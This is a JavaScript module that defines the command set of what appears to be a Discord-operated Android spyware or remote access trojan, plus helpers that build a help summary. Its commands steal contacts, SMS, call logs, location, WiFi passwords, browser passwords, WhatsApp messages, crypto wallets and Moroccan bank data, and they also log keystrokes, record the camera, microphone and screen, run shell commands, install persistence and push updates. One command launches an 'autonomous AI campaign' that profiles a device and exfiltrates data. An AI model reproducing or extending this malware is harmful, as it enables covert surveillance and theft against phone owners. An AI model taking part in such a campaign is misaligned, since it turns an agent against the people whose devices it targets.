export const COMMAND_DEFS = [
  {
    cmd: '!target',
    args: '<device-name>',
    description: 'Target a specific device by its channel name (e.g., !target device-pixel7 or !target pixel7)',
    category: 'targeting',
    output: 'Confirms the targeted device',
  },
  {
    cmd: '!untarget',
    args: '',
    description: 'Clear current target selection',
    category: 'targeting',
    output: 'Target cleared',
  },
  {
    cmd: '!contacts',
    args: '',
    description: 'Get all contacts from the device',
    category: 'intel',
    output: 'List of names, phone numbers, emails',
  },
  {
    cmd: '!sms',
    args: '',
    description: 'Get SMS messages from the device (last 50+)',
    category: 'intel',
    output: 'SMS threads with sender, message, timestamp',
  },
  {
    cmd: '!call_log',
    args: '',
    description: 'Get call history from the device',
    category: 'intel',
    output: 'Call log entries with number, duration, type, timestamp',
  },
  {
    cmd: '!location',
    args: '',
    description: 'Get current GPS location of the device',
    category: 'intel',
    output: 'GPS coordinates, address, IP geolocation',
  },
  {
    cmd: '!installed',
    args: '',
    description: 'Get list of all installed applications',
    category: 'intel',
    output: 'Package names, app names, version codes',
  },
  {
    cmd: '!clipboard',
    args: '',
    description: 'Read the device clipboard contents',
    category: 'intel',
    output: 'Current clipboard text',
  },
  {
    cmd: '!battery',
    args: '',
    description: 'Get battery status and level',
    category: 'device',
    output: 'Battery percentage, charging status, temperature',
  },
  {
    cmd: '!processes',
    args: '',
    description: 'List running processes on the device',
    category: 'device',
    output: 'Process list with PIDs and names',
  },
  {
    cmd: '!wifi',
    args: '',
    description: 'Get saved WiFi passwords from the device',
    category: 'intel',
    output: 'SSID/password pairs (may require root)',
  },
  {
    cmd: '!screenshot',
    args: '',
    description: 'Take a screenshot of the device screen',
    category: 'media',
    output: 'Image file (PNG)',
  },
  {
    cmd: '!camera',
    args: '',
    description: 'Take a photo using the device camera (back camera by default)',
    category: 'media',
    output: 'Image file (JPEG)',
  },
  {
    cmd: '!mic',
    args: 'record <duration> or stop',
    description: 'Record audio from device microphone, or stop active recording',
    category: 'media',
    output: 'Audio file (MP3/OGG)',
  },
  {
    cmd: '!shell',
    args: '<command>',
    description: 'Execute a shell command on the device. Use cd <path> first to change directory.',
    category: 'power',
    output: 'Command output text',
  },
  {
    cmd: '!grabber',
    args: '<target>',
    description: 'Grab files/data from device. Targets: all, browser, messenger, tokens, wallets, files, clipboard, banks (Moroccan banks), whatsapp (ALL messages via SQLite), chrome (history+passwords), docs (PDF, DOCX, XLSX)',
    category: 'power',
    output: 'Categorized text report + raw ZIP file',
  },
  {
    cmd: '!upload',
    args: '<file-path>',
    description: 'Upload a file from the device to Discord',
    category: 'power',
    output: 'File posted to channel',
  },
  {
    cmd: '!stream',
    args: 'start [fps], stop, or voice <channel> <guild>',
    description: 'Start/stop streaming — text screen capture at 2fps, or voice channel at 30fps',
    category: 'media',
    output: 'Live screen feed or voice stream',
  },
  {
    cmd: '!keylog',
    args: 'on, off, or get',
    description: 'Enable/disable keylogger. Use get to retrieve logged keystrokes.',
    category: 'intel',
    output: 'Logged keystrokes text',
  },
  {
    cmd: '!notifications',
    args: '',
    description: 'Show recent notifications (requires Notification Listener)',
    category: 'device',
    output: 'Recent notification list',
  },
  {
    cmd: '!admin',
    args: '',
    description: 'Request device admin privileges',
    category: 'device',
    output: 'Admin status confirmation',
  },
  {
    cmd: '!update',
    args: 'check, push <url>, install, or clear',
    description: 'Self-update system — check, push APK, install, or clear pending update',
    category: 'system',
    output: 'Update status information',
  },
  {
    cmd: '!config',
    args: 'get, push <json>, or reset',
    description: 'Remote configuration management',
    category: 'system',
    output: 'Config JSON or status',
  },
  {
    cmd: '!persist',
    args: '',
    description: 'Install persistence mechanism (alarm-based repeat service)',
    category: 'system',
    output: 'Persistence status confirmation',
  },
  {
    cmd: '!dir',
    args: '<path>',
    description: 'List directory contents. Alias: !ls. Defaults to last working directory.',
    category: 'files',
    output: 'File listing (ls -la style)',
  },
  {
    cmd: '!ls',
    args: '<path>',
    description: 'Alias for !dir — list directory contents',
    category: 'files',
    output: 'File listing (ls -la style)',
  },
  {
    cmd: '!tree',
    args: '<path>',
    description: 'Recursive directory tree listing',
    category: 'files',
    output: 'File tree (find output)',
  },
  {
    cmd: '!find',
    args: '<pattern>',
    description: 'Find files by name pattern. Example: !find *.pdf',
    category: 'files',
    output: 'Matching file paths',
  },
  {
    cmd: '!cat',
    args: '<path>',
    description: 'Read file contents',
    category: 'files',
    output: 'File text content',
  },
  {
    cmd: '!info',
    args: '<path>',
    description: 'Show file/directory details (size, modified, permissions, owner)',
    category: 'files',
    output: 'File info from stat',
  },
  {
    cmd: '!disk',
    args: '',
    description: 'Show disk space usage (df -h)',
    category: 'files',
    output: 'Disk space report',
  },
  {
    cmd: '!recent',
    args: '[count]',
    description: 'Show N most recently modified files. Default: 20',
    category: 'files',
    output: 'Recently modified file list',
  },
  {
    cmd: '!ext',
    args: '<extension>',
    description: 'Find files by extension. Example: !ext pdf',
    category: 'files',
    output: 'Matching file paths',
  },
  {
    cmd: '!download',
    args: '<path>',
    description: 'Download a file from the device to Discord (max 25MB)',
    category: 'files',
    output: 'File posted to channel',
  },
  {
    cmd: '!rm',
    args: '<path>',
    description: 'Delete a file or empty directory',
    category: 'files',
    output: 'Deletion confirmation',
  },
  {
    cmd: '!mv',
    args: '<src> <dst>',
    description: 'Move or rename a file/directory',
    category: 'files',
    output: 'Move confirmation',
  },
  {
    cmd: '!cp',
    args: '<src> <dst>',
    description: 'Copy a file',
    category: 'files',
    output: 'Copy confirmation',
  },
  {
    cmd: '!mkdir',
    args: '<path>',
    description: 'Create a directory',
    category: 'files',
    output: 'Directory creation confirmation',
  },
  {
    cmd: '!campaign',
    args: '<objective>',
    description: 'Start an autonomous AI campaign. AI plans, executes, adapts, and delivers a report. Example: !campaign profile device-7 and exfil telegram',
    category: 'system',
    output: 'Full campaign plan, execution, and intelligence report',
  },
]

export function getCommandsForCategory(cat) {
  return COMMAND_DEFS.filter(c => c.category === cat)
}

export function generateCommandsSummary() {
  const byCat = {}
  for (const def of COMMAND_DEFS) {
    if (!byCat[def.category]) byCat[def.category] = []
    byCat[def.category].push(def)
  }
  let output = ''
  for (const [cat, cmds] of Object.entries(byCat)) {
    output += `\n=== ${cat.toUpperCase()} ===\n`
    for (const c of cmds) {
      output += `${c.cmd} ${c.args} — ${c.description}\n`
    }
  }
  return output
}
